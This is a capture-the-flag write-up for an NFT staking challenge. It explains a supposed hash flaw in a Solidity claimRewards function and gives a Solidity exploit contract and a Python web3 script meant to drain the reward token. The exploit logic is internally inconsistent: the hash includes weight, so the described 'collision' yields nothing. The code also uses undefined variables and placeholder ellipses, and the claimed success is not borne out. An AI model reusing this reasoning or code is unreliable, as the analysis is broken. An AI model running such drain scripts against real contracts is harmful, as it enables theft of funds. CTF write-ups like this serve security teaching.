# NFTrap

**Category:** Web3/Blockchain
**Points:** 100
**Difficulty:** - medium    

## Challenge Description

An NFT staking protocol allows users to stake NFTs and earn token rewards. The goal is to drain the token contract.

## Challenge Files

- `NFT.sol` - Simple ERC721 implementation
- `Token.sol` - ERC20 reward token
- `Staking.sol` - The vulnerable staking contract
- `Setup.sol` - Challenge setup, win condition: token balance < 2 ETH

## Vulnerability Analysis

### The Staking Contract

The `Staking.sol` contract allows users to:
1. Stake NFTs from whitelisted collections
2. Earn rewards based on staking duration and NFT weight
3. Claim rewards by providing staking info

### The Bug: Missing Collection in Hash

In `claimRewards()`, the hash validation is flawed:

```solidity
function claimRewards(address nftCollection, uint256 tokenId, uint256 weight, uint256 timestamp) external {
    bytes32 hash = keccak256(abi.encodePacked(msg.sender, tokenId, weight, timestamp));
    require(stakes[hash].staker == msg.sender, "Invalid stake");
    // ... reward calculation
}
```

**The hash does NOT include `nftCollection`!**

But when staking, each collection has different weights:
```solidity
function stake(address nftCollection, uint256 tokenId) external {
    uint256 weight = collectionWeights[nftCollection];
    bytes32 hash = keccak256(abi.encodePacked(msg.sender, tokenId, weight, block.timestamp));
    // ...
}
```

### The Attack

1. Stake an NFT with tokenId=1 from Collection A (weight=1)
2. Stake an NFT with tokenId=1 from Collection B (weight=10)
3. When claiming rewards for Collection A's stake, pass Collection B's weight
4. The hash matches because `nftCollection` isn't part of the hash
5. Receive 10x the rewards!

## Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Staking.sol";
import "./NFT.sol";

contract Exploit {
    Staking public staking;
    NFT public lowWeightNFT;
    NFT public highWeightNFT;

    constructor(address _staking, address _lowNFT, address _highNFT) {
        staking = Staking(_staking);
        lowWeightNFT = NFT(_lowNFT);
        highWeightNFT = NFT(_highNFT);
    }

    function attack() external {
        // Mint NFTs with same tokenId from different collections
        uint256 tokenId = 1;

        // Stake from both collections
        lowWeightNFT.approve(address(staking), tokenId);
        highWeightNFT.approve(address(staking), tokenId);

        staking.stake(address(lowWeightNFT), tokenId);
        staking.stake(address(highWeightNFT), tokenId);

        // Wait some time for rewards to accumulate...

        // Claim with wrong weight - pass highWeight collection but use lowWeight's stake
        // Hash collision because nftCollection not in hash!
        uint256 highWeight = staking.collectionWeights(address(highWeightNFT));

        // This gives us highWeight rewards for lowWeight stake
        staking.claimRewards(address(lowWeightNFT), tokenId, highWeight, stakingTimestamp);
    }
}
```

### Python Exploit Script

```python
from web3 import Web3
from eth_account import Account
from eth_abi import encode

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)

# Get collection weights
low_weight = staking.functions.collectionWeights(low_nft_addr).call()
high_weight = staking.functions.collectionWeights(high_nft_addr).call()

print(f"Low weight: {low_weight}, High weight: {high_weight}")

# Mint and stake NFTs with same tokenId
token_id = 1

# Stake both
stake_low_tx = staking.functions.stake(low_nft_addr, token_id).build_transaction(...)
stake_high_tx = staking.functions.stake(high_nft_addr, token_id).build_transaction(...)

# Get staking timestamp from events/state

# Claim with high weight for low weight stake
claim_tx = staking.functions.claimRewards(
    low_nft_addr,    # Collection doesn't matter for hash
    token_id,        # Same tokenId
    high_weight,     # Use the higher weight!
    stake_timestamp  # Original timestamp
).build_transaction(...)

# Repeat to drain tokens below 2 ETH threshold
```

## Result

Successfully drained the token contract from 10 ETH to below 2 ETH by exploiting the hash collision vulnerability.

## Key Takeaways

1. **Always include all relevant parameters in hash calculations** - The nftCollection was passed to the function but not included in the validation hash
2. **Review hash compositions carefully** - Missing a single parameter can lead to collision attacks
3. **Consider what an attacker controls** - If they control which collection they claim for, the validation must account for it

## Flag

`HACKDAY{...}`
